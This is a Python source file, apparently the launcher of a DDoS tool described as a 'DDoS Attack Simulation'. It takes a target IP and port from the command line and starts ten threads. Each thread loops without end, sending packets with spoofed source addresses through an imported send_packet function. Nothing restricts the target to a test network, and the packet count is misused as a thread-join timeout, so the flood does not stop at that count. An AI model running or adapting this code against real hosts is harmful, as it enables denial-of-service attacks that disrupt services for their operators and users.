import sys
import threading
from argparse import ArgumentParser
from utils.ip_utils import generate_private_ip
from utils.attack import send_packet
from config.settings import PACKET_COUNT

def start_attack(target_ip, target_port, packet_count):
    print(f"Starting attack on {target_ip}:{target_port} with {packet_count} packets.")
    
    def attack_thread():
        while True:
            ip = generate_private_ip()
            try:
                send_packet(target_ip, target_port, ip)
            except Exception as e:
                print(f"Error in thread: {e}")

    threads = []
    max_threads = 10  # Limit the number of threads to prevent resource exhaustion
    for _ in range(max_threads):
        thread = threading.Thread(target=attack_thread)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join(packet_count)

if __name__ == "__main__":
    parser = ArgumentParser(description="DDoS Attack Simulation")
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", required=True, type=int, help="Target port")
    parser.add_argument("-c", "--count", type=int, default=PACKET_COUNT, help="Number of packets to send")

    args = parser.parse_args()

    start_attack(args.ip, args.port, args.count)
